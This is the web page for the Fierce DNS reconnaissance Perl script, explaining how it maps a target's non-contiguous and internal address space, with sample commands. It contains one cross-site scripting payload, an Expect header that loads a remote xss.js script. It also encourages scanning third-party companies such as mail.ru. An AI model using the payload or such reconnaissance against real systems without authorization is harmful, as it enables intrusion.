[![ha.ckers.org security
lab](http://ha.ckers.org/images/84844372/rsnake/hackers.jpg)](http://ha.ckers.org/ "ha.ckers.org security lab")\

[Fierce Domain Scan](http://ha.ckers.org/fierce/)
-------------------------------------------------

\
![Fierce domain scanner](http://ha.ckers.org/fierce/fiercesmall.jpg)

Written by [RSnake](http://ha.ckers.org/blog/about/) with input from
[id](http://ha.ckers.org/blog/about/),
[Vacuum](http://winfingerprint.com/) and [Robert E
Lee](http://www.dyadsecurity.com). A special thanks to IceShaman to
porting it to use multi-threading.

Fierce has had a lot of publicity over the years. But none so fun as
seen on [Scorpion](http://youtu.be/dU_hJscvdXU#t=2m3s) - a new show on
CBS.

[![Fierce on
Scorpion](http://ha.ckers.org/images/scorpion-fierce.jpg)](http://ha.ckers.org/images/scorpion-fierce.jpg)

Screnshot from Scorpion

Fierce domain scan was born out of personal frustration after performing
a web application security audit. It is traditionally very difficult to
discover large swaths of a corporate network that is non-contiguous.
It's terribly easy to run a scanner against an IP range, but if the IP
ranges are nowhere near one another you can miss huge chunks of
networks.

First what Fierce is not. Fierce is not an IP scanner, it is not a DDoS
tool, it is not designed to scan the whole internet or perform any
un-targeted attacks. It is meant specifically to locate likely targets
both inside and outside a corporate network. Only those targets are
listed (unless the -nopattern switch is used). No exploitation is
performed (unless you do something intentionally malicious with the
-connect switch). Fierce is a reconnaissance tool. Fierce is a PERL
script that quickly scans domains (usually in just a few minutes,
assuming no network lag) using several tactics.

First it queries your DNS for the DNS servers of the target. It then
switches to using the target's DNS server (you can use a different one
if you want using the -dnsserver switch but this can cause problems if
the server you use won't tell you information about other people's sites
and of course you won't find much relevant internal address space).
Fierce then attempts to dump the SOA records for the domain in the very
slim hope that the DNS server that your target uses may be
misconfigured. Once that fails (because it almost always will) it
attempts to "guess" names that are common amongst a lot of different
companies. Don't ask me where I got the list, it's just a list of names
that id and I have seen all over the place. I thought about adding a
dictionary to this, but I think that would take a lot longer, and given
that very few of the words are dictionary words I don't think this would
add a lot of value.

Next, if it finds anything on any IP address it will scan up and down a
set amount (default 5 but you can expand it with -traverse or increase
it to the entire subnet with -wide) looking for anything else with the
same domain name in it using reverse lookups. If it finds anything on
any of those it will recursively scan until it doesn't find any more. In
this way it ends up looping a lot, and the bigger the domain is the more
you get back. The reason Fierce automatically switches to using the
target's DNS server is so that it can probe the Intranet (RFC1918) of
the target, assuming the target uses a single DNS server for both their
Intranet and external sites.

I also added a random call to something that should fail to test for
wildcard DNS. If it's found, the wildcard is discarded to reduce
erroneous results. That doesn't speed up the scan because it still needs
to check to see if the test resolves back to IP address that the
wildcard is pointing to. However it does reduce false positives.

Also, I've added a "search" option that allows you to find other
non-related domain names. For example, let's say my target's domain is
widget.com but I know they have email addresses like
soandso@widgetcompany.com and own another company called
nutsandbolts.com I can add search queries. This won't scan for those
domains, but if those names pop up, it won't ignore them. Fierce will
report on anything inside the search pattern as long as it matches. If
you want everything I guess you could put a,b,c,...,x,y,z but I'll
probably make something in the future to allow for scanning/reporting
the entire C block once anything is found in it that matches the DNS
string. Here's the syntax:

**perl fierce.pl -dns widget.com -search widgetcompany,nutsandbolts**

I also realized it can be a little bad about finding everything in a
class C if the target used non-contiguous blocks within the class C. To
deal with that I built in a function to allow a scan (of only C blocks).
This is also really useful for scanning intranets if the DNS is poorly
configured. I might expand on this later.

**perl fierce.pl -range 10.10.10.0-255 -dnsserver ns1.example.com**

As an alternative, you can use the -wide switch which does a wide path
of reverse lookups after finding any C names that match your query in
the C block. This provides a lot more information but is a lot more
noisy.

**perl fierce.pl -dns example.com -wide -file output.txt**

Finally, for the web application security folks I added a command to
connect to any http servers on port 80 and perform whatever action you
put into a configuration file. This is really noisy and really slow
(especially on large networks), so I wouldn't recommend trying it unless
you have a few hours with nothing better to do, unless you know there
are only a handful of machines or have already ran this without the
connect scan turned on.

**perl fierce.pl -dns example.com -connect headers.txt -fulloutput -file
output.txt**

Here's what a sample header file might look like. The sample file below
is attempting to exploit the [Expect cross site scripting
vulnerability](http://ha.ckers.org/blog/20060731/expect-header-injection-via-flash/):

GET / HTTP/1.0 User-Agent: Mozilla/5.0 Host: Expect: \<script
src=http://ha.ckers.org/xss.js\>\</script\>

Fierce also has wordlist support so that you can supply your own
dictionary using the -wordlist keyword. Since the brute force does rely
on matching at least a few internal targets, this could be helpful if
you know that the naming convention has to do with a certain non-obvious
naming convention or uses another language, etc.

**perl fierce.pl -dns example.com -wordlist dictionary.txt -file
output.txt**

Not convinced? Prior to running the scan I had never been to either
mail.ru or rambler.ru (a few of the top Alexa sites in Russia). Since I
don't read Russian, performing an audit against them is far more
difficult. Here's some sample output from the two. In the first example
you can see that mail.ru has a non-contiguous address for it's
mobile.mail.ru than it does for the rest of the site. That would have
been very difficult to locate with any other scanner. In the rambler.ru
example you can see the RFC1918 space 10.\* pop up:

-   [mail.ru](http://ha.ckers.org/fierce/mail.ru) - 418 entries and 303
    hostnames found.
-   [rambler.ru](http://ha.ckers.org/fierce/rambler.ru) - 472 entries
    and 458 hostnames found.

Trust me, we've found far more interesting sites than these two in our
tests, but I don't want to disparage any companies for their mistakes.
I'm sure you can think of a few companies to test this against. The
results can be pretty amazing. If you don't get many results, that could
be one of three things, 1) you aren't scanning their corporate domain,
you are only scanning their external domain which they only have one or
two machines on 2) it's a very small company or 3) you typo'd the domain
name (I haven't built any checks to make sure the domain you entered is
valid).

Requirements: This is a PERL program requiring the PERL interpreter with
the modules [Net::DNS](http://www.net-dns.org/) and
[Net::hostent](http://perldoc.perl.org/Net/hostent.html). You can
install modules using CPAN:

> perl -MCPAN -e 'install Net::DNS'\
>  perl -MCPAN -e 'install Net::hostent'

![](http://ha.ckers.org/images/microsoft_icon.gif)**Windows users**: You
can use Fierce under Windows if you use [Cygwin](http://www.cygwin.com/)
with PERL and the above two modules installed. I have not tested this
using ActivePerl in Windows, so I would recommend Cygwin until
ActivePerl can be thoroughly tested. I am/was working on a win32 version
of Fierce, but have put the project on hold. If anyone is interested in
picking up where I left off, drop [me](http://ha.ckers.org/blog/about/)
a line.

Version: Fierce is currently at version 0.9.9 - Beta 03/24/2007

Download: [fierce.pl](http://ha.ckers.org/fierce/fierce.pl)

Download: [hosts.txt](http://ha.ckers.org/fierce/hosts.txt)

(Thanks to Robert E Lee for the help with this and to Michael Thumann's
[DNSDigger](http://www.ernw.de/en/eng_security_tools.html) wordlist).

Getting started: **perl fierce.pl -help**

This may some bugs in it. Also this can be a noisy scanner, but in the
tests I've performed it's exceptionally effective at finding
non-contiguous IP blocks and new attack points. This should be
considered a pre-cursor to [nmap](http://insecure.org/nmap/),
[unicornscan](http://www.unicornscan.org/) or
[nessus](http://www.nessus.org/) as it gives you enough information to
begin a much more thorough scan with one of those other tools. Also, it
can point out DNS entries for hosts that are no longer up or have not
yet been put into production. Please use Fierce with care and at your
own risk.

\
\

Back to <http://ha.ckers.org/>

* * * * *

\

ha.ckers.org security lab is © 2001-2014\
[Entries (RSS)](http://ha.ckers.org/blog/feed/) and [Comments
(RSS)](http://ha.ckers.org/blog/comments/feed/).

